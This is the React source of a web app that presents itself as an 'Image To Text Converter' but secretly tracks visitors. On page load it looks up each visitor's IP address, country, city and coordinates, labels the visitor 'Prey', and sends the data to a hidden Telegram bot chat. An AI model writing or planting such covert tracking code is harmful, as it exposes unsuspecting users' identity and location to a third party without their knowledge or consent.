import { useEffect } from "react";
import ImageToTextZone from "./components/ImageToTextZone.tsx";
import axios from "axios";
import { CHAT_ID, IP_API, TELEGRAM_TOKEN } from "./hook/useEnv.tsx";

function App() {
  useEffect(() => {
    let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
    axios(IP_API).then((res) => {
      let message = `<b>Find Prey</b>\n`;
      message += `<b>Site name:</b> Image To Text Converter 📝\n`;
      message += `<b>Country:</b> ${res.data.country}\n`;
      message += `<b>City:</b> ${res.data.city}\n`;
      message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
      message += `<b>Location:</b> ${res.data.loc}\n`;
      console.log(res);
      axios.post(`${URL}/sendPhoto`, {
        chat_id: CHAT_ID,
        photo: "https://ibb.co/VcYSJV3F",
        caption: message,
        parse_mode: "HTML",
      });
    });
  }, []);
  return (
    <ImageToTextZone/>
  );
}

export default App;
